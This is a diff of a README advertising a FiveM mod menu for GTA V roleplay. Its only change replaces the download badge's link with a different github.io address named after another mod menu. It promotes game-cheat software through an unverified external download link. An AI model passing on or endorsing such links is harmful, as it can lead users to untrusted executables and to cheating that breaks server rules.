@@ -4,7 +4,7 @@ Welcome to the **next evolution** in GTA V RP gameplay. This advanced **FiveM Mo
 
 Created for both **tactical players** and **modding enthusiasts**, this tool provides a highly configurable and user-friendly experience, wrapped in an intuitive interface.
 
-[![Download Mod Menu](https://img.shields.io/badge/Download-FiveM--RP--Control--Tool-purple)](https://fivem-mod-menu-lunacy.github.io/,github)
+[![Download Mod Menu](https://img.shields.io/badge/Download-FiveM--RP--Control--Tool-purple)](https://kiddions-mod-menu-pro.github.io/.github/)
 
 ---
 
